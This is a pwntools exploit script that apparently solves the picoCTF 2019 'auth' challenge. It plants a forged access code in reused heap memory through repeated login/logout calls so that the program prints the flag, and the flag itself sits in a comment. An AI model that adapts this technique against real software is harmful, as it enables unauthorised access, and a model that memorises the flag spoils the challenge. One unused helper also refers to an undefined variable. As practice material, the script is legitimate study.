from pwn import *
import sys
import subprocess
import r2pipe
# picoCTF{g0ttA_cl3aR_y0uR_m4110c3d_m3m0rY_8aa9bc45}
argv = sys.argv

DEBUG = True
BINARY = './auth'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

if context.bits == 64:
  r = process(['ROPgadget', '--binary', BINARY])
  gadgets = r.recvall().strip().split('\n')[2:-2]
  gadgets = map(lambda x: x.split(' : '),gadgets)
  gadgets = map(lambda x: (int(x[0],16),x[1]),gadgets)
  r.close()

  pop_rdi = 0
  pop_rsi_r15 = 0
  pop_rdx = 0

  for addr, name in gadgets:
    if 'pop rdi ; ret' in name:
      pop_rdi = addr
    if 'pop rsi ; pop r15 ; ret' in name:
      pop_rsi_r15 = addr
    if 'pop rdx ; ret' in name:
      pop_rdx = addr

  def call(f, a1, a2, a3):
    out = ''
    if a1 != None:
      out += p64(pop_rdi)+p64(a1)
    if a2 != None:
      out += p64(pop_rsi_r15)+p64(a2)*2
    if a3 != None:
      if pop_rdx == 0:
        print 'RDX GADGET NOT FOUND'
        exit(-1)
      else:
        out += p64(rdx)+p64(a3)
    return out+p64(f)

r2 = r2pipe.open(BINARY)
plts = r2.cmd('ii').strip().split('\n')[2:]
r2.quit()
plts = filter(lambda x: 'GLOBAL    FUNC' in x, plts)
plts = filter(lambda x: '_' not in x, plts)
plts = map(lambda x: x.split('  GLOBAL    FUNC '), plts)
plts = map(lambda x: (int(x[0].split(' ')[-1], 16), x[1]), plts)
temp = {}
for addr, name in plts:
  temp[name] = addr
plts = temp
print plts

def attach_gdb():
  gdb.attach(sh)


if DEBUG:
  context.log_level = 'debug'

if len(argv) < 2:
  stdout = process.PTY
  stdin = process.PTY

  sh = process(BINARY, stdout=stdout, stdin=stdin)

  if DEBUG:
    attach_gdb()

  REMOTE = False
else:
  sh = remote('2019shell1.picoctf.com', 12286)
  REMOTE = True

code = ''
code += unhex('4343415f544f4f52')[::-1]
code += unhex('45444f435f535345')[::-1]
print code

sh.sendlineafter('> ', 'login')
sh.sendlineafter('username\n', '32')


payload = ''
payload += p64(0x0000000000602000) # username ptr
payload += code
payload += p64(0xdeadbeefdeadbeef) # files ptr

sh.sendlineafter('username\n', payload)
sh.sendlineafter('> ', 'logout')


# sh.sendlineafter('> ', 'login')
# sh.sendlineafter('username\n', '16')
# sh.sendlineafter('username\n', 'aaa')

sh.sendlineafter('> ', 'login')
sh.sendlineafter('username\n', '16')
sh.sendlineafter('username\n', 'bbb')

sh.sendlineafter('> ', 'print-flag')

sh.interactive()
  